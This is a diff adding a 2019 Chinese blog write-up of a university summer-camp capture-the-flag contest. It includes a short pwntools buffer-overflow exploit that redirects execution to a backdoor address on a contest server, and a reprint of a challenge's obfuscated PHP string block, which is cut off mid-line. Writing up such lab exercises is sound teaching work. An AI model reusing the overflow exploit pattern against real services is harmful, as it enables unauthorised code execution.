@@ -1,0 +1,1266 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>中原工学院Drops夏令营新生赛writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup,ctf">
+  
+
+  
+    <meta name="description" content="本篇博客记录了本人参加drops攻防训练营最后的新生赛的一些writeup,很菜，勿喷！！！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">中原工学院Drops夏令营新生赛writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2019/08/15/drops-new-2019/">
+      中原工学院Drops夏令营新生赛writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2019年8月15日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客记录了本人参加drops攻防训练营最后的新生赛的一些writeup,很菜，勿喷！！！</p>
+<a id="more"></a>
+
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>和攻防世界level0相似，改下之前前脚本就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;101.132.41.135&quot;,&quot;10000&quot;)</span><br><span class="line">v &#x3D; 0x80485E6</span><br><span class="line">payload &#x3D; 112*&#39;a&#39; + p32(v)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>v是后门函数的地址</p>
+<p>112*’a’代表0x6c大小的buf加上32位4个字节的ebp</p>
+<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="chaos-file"><a href="#chaos-file" class="headerlink" title="chaos file"></a>chaos file</h3><p>打开网址看到是这样的：</p>
+<p><img src="/2019/08/15/drops-new-2019/20190810181622.png"></p>
+<p>把php代码整理一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> $_ &#x3D; &lt;&lt;&lt;asdfiohaefho</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doV1YwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldoVVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldoVFYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0docFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowed&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklUm1SWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span 